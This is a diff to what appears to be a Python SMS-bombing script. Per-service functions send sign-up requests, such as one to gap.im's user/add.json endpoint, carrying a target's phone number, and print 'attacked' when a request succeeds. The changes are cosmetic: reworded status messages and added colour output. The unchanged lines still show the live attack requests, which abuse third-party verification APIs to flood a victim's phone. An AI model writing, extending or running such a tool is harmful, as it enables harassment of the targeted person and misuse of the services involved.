@@ -5,6 +5,7 @@ import sys
 from threading import Thread
 from colorama import Fore
 from time import sleep
+from colored import fg, bg, attr
 proxy = {"https": "127.0.0.1.8000"}
 os.system("clear")
 print(Fore.RED)
@@ -53,9 +54,9 @@ def shad(phone):
         if "OK" in shadR.text:
             print (Fore.Green+"shad Send")
         else:
-            print ("No Attack :(")
+            print ("not the found")
     except:
-        print ("No Attack  :(")
+        print ("is not attack")
 
 def gap(phone):
     #gap api
@@ -63,7 +64,7 @@ def gap(phone):
     try:
         gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
         if "OK" in gapR.text:
-            print ("attacked-*")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
             print ("not found target-!")
     except:
